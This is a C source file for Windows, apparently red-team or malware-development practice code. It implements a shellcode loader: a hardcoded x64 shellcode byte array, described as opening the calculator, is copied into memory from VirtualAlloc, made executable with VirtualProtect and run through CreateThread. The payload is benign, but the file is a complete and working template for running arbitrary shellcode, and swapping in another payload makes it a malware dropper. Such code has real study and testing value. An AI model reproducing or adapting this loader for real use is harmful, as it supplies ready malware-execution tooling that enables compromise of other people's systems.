#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 


int main(){
    printf("[*] Program is running\n");

    void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	// Payload to open calculator
    unsigned char payload[] = "\x48\x31\xc0\x48\x31\xc9\x65\x48\x8b\x48\x60\x48\x8b\x49\x18\x48\x8b\x49\x20\x48\x8b\x09\x48\x8b\x09\x48\x8b\x49\x20\x49\x89\xca\x8b\x49\x3c\x4c\x01\xd1\x8b\x89\x88\x00\x00\x00\x4c\x01\xd1\x4d\x31\xc9\x44\x8b\x49\x1c\x4d\x01\xd1\x4d\x31\xdb\x44\x8b\x59\x20\x4d\x01\xd3\x4d\x31\xe4\x44\x8b\x61\x24\x4d\x01\xd4\x48\x31\xc9\xb9\x07\x00\x00\x00\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x00\x50\x51\xe8\x05\x00\x00\x00\x49\x89\xc6\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xd7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x81\x4c\x01\xd0\x53\xc3\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6";
    
    unsigned int payload_len = 188;	

	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("%-20s : 0x%-016p\n", "[*] Shellcode loaded at " , (void *)exec_mem);

	printf("[*] Enter to run shellcode! [*]\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

    
}